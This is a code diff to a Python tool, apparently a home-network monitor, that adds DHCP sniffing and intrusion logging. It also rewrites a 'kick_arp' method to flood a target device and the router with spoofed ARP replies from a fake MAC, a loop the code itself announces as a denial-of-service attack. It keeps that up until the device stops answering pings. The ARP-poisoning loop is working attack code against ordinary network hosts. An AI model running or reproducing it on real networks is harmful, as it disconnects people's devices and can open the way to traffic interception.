@@ -18,10 +18,12 @@ import pyfiglet
 import requests, time, os, socket
 from plyer import notification
 import pyttsx3, threading
+from pathlib import Path
+from datetime import datetime
 
 
 # NETWORK IMPORTS
-from scapy.all import IP, send, UDP, ICMP, sr1flood, sr1, ARP, Ether, sendp, sendpfast
+from scapy.all import IP, send, UDP, ICMP, sr1flood, sr1, ARP, Ether, sendp, sendpfast, sniff
 
 
 class connection_status():
@@ -227,9 +229,11 @@ class utilities():
             console.print(e)
             vendor = manuf.MacParser().get_manuf_long(mac)
             return vendor
+    
+
         
     
-    def unauthorized_handler(self, ip, mac):
+    def kick_arp(self, ip: str, mac: str):
         """Responsible for disallowing unauthorized devices found on the network"""
 
         console.print(f"{ip} <---> {mac}")
@@ -246,7 +250,15 @@ class utilities():
         packet_layer_3 = IP(src="192.168.1.1", dst=ip) / UDP(sport=1234, dport=80) / payload
 
         # LAYER 2 PACKET // ARP
-        packet_layer_2 = Ether(src="4c:19:5d:15:76:8b", dst=mac) / ARP(psrc="192.168.1.1", pdst=ip) 
+
+        mac = mac.strip()
+
+        router_mac = "4c:19:5d:15:76:8b"
+
+        fake_mac = "00:12:ff:12:44:12"
+
+        packet_layer_2 = Ether(src= fake_mac, dst=mac) / ARP(psrc="192.168.1.1", pdst=ip, hwsrc= fake_mac, hwdst=mac) 
+        packet_for_router = Ether(src=fake_mac, dst=router_mac) / ARP(psrc=ip, pdst="192.168.1.1", hwsrc=fake_mac, hwdst=router_mac)
 
         # NOTIFY USER THAT THE ATTACK IS STARTING
         msg_start = f"Now launching a Denial-of-service attack on {ip}"
@@ -254,35 +266,165 @@ class utilities():
 
         while online:
 
-            send(packet_layer_2, verbose=False)
+            sendp(packet_layer_2, verbose=False)
+            sendp(packet_for_router, verbose=False)
             
-            if packets_sent > 100000:
+            if packets_sent > 10000:
 
                 ping = IP(dst=ip) / ICMP()
-
-                response = sr1(ping, timeout=2)
+                
+                # WAIT BEFORE PINGING TO SEE IF DEVICE CONNECTS BACK
+                time.sleep(5)
+                response = sr1(ping, timeout=5, verbose=False)
+                total_packets += packets_sent
 
 
                 if response:
                     console.print(f"Device: {ip} is still online resuming Denial-of-Service attack")
 
                 else:
-                    msg = f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} sent"
+                    
+          
+                    msg = f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent"
                     #utilities().tts(msg)
-                    console.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} sent")
+                    console.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent")
+                   
+                   # CREATE A THREAD RESPONSIBLE FOR KEEPING DEVICE DISCONNECTED
+                    dhcp_monitor = dhcp_capture()  # Instantiate the class properly
+                    sniff_thread = threading.Thread(target=dhcp_monitor.start, daemon=True)
+                    sniff_thread.start()
+
                     online = False
             
                 # RESPONSIBLE FOR KEEPING TRACK OFF TOTAL PACKETS SENT // RESTART PACKETS_SENT VARIABLE
-                total_packets += packets_sent
+                
                 packets_sent = 0
 
             
-            print(f"Packets sent: {packets_sent}", end='\r', flush=True)
+            print(f"Packets sent: {total_packets}", end='\r', flush=True)
             packets_sent += 1
-    
 
+    
+    def kick_blacklist(self, vendor: str, host: str, ip: str, mac: str):
+        """This method will be using // communicating directly with your local router"""
+
+        if host == "N/A" and vendor == "Not availiable":
+            option = f"with a ip address of: {ip}"
+        
+        elif host == "N/A":
+            option = f"with a vendor from: {vendor}"
+        
+        else:
+            option = f"with a hostname of: {host}"
 
         
+        letter = f"Successfully blacklisted a device, {option}"
+        utilities().tts(letter)
+
+    
+
+class dhcp_capture():
+    """Responsible for listening and capturing dhcp packets"""
+
+    
+    def dhcp_traffic(self, packet):
+        """Responsible for intercepting and blocking dhcp traffic"""
+
+        console.print("test print")
+        
+        try:
+            if packet.haslayer("BOOTP"):
+
+                mac = packet.hwsrc
+                ip = packet.psrc
+
+                console.print(f"Found Device:{ip} <--> {mac} trying to obtain a dhcp ip address!")
+        
+        except Exception as e:
+            console.print(e)
+
+            
+    
+    def start(self):
+        """Launch the main method within this method"""
+
+        console.print(f"\nNow Launching background thread to keep network secure\n")
+        sniff(filter="udp and (port 67 or port 68)", prn= lambda packet: self.dhcp_traffic(packet), store=0)
+        console.print("[bold red]END[/bold red]")
+
+
+
+    
+class Logging:
+    """This class holds and stores any and all intrusions // detailed information on intrusions"""
+
+
+    def __init__(self):
+
+        # CREATE BASE DIRECTORY
+        base_dir = Path.home() / "Documents" / "nsm tools" / ".data" / "NetAlert2"
+        base_dir.mkdir(parents=True, exist_ok=True)
+        
+        # CREATE METHOD FILE PATH // FOR LOG SAVING
+        self.file_log = base_dir / "log_file.txt"
+        
+
+    def log_results_write(self, log):
+        """Responsible for keeping up to date with intrusions found"""
+
+        # LOOP SO THAT WAY FILE CAN BE CREATED AND RETRIED!!!
+        while True:
+
+            # CREATE TIMESTAMP FOR ACCURATE / DETAILED LOGGING
+            now = datetime.now()
+            time_stamp = now.strftime("%Y-%m-%d %H:%M:%S")
+
+            # CREATE THE LOG FORMAT TO THEN BE SAVED
+            log_format = f"Timestamp: {time_stamp} - {log}\n"
+    
+            try:
+
+                with open(self.file_log, "a") as file:
+                    file.write(log_format)
+                    console.print("\n[bold green]Successfully logged[/bold green] [bold red]Intrusion![/bold red]")
+                    break
+            
+            except FileNotFoundError as e:
+                console.print(f"[bold red]{e}[/bold red]")
+                #console.print("[bold green]Successuflly Created logging file pathway![/bold green]")
+                
+                # CREATE LOGGING FILE PATH SINCE IT WASNT FOUND
+                with open(self.file_log, "w") as file:
+                    file.write("[bold green]Welcome To NetAlert Intrusion Logging[/bold green]\n\n\n")
+    
+
+    def  log_results_read(self):
+        """Responsible for pulling log results and outputting // returning them"""
+
+        
+        while True:
+            try:
+                with open(self.file_log, "r") as file:
+                    content = file.read()
+                    console.print(content)
+                    break
+    
+            except FileNotFoundError as e:
+                # CREATE LOGGING FILE PATH SINCE IT WASNT FOUND
+                with open(self.file_log, "w") as file:
+                    file.write("[bold green]Welcome To NetAlert Intrusion Log[/bold green]\n\n\n")
+                console.print(f"[bold red]Logging File Path Successfully Created\n\n[/bold red]")
+               # console.print("[bold blue]No File found meaning no intrusions![/bold blue]\n[bold green]Your Network has been Safetly Secured!!![/bold green]")
+
+            except Exception as e:
+                console.print(e)
+                console.input("\n\n[bold red]Press enter to exit: [/bold red]")
+                break      
+
+            
+
+
+
 
 
 def main():
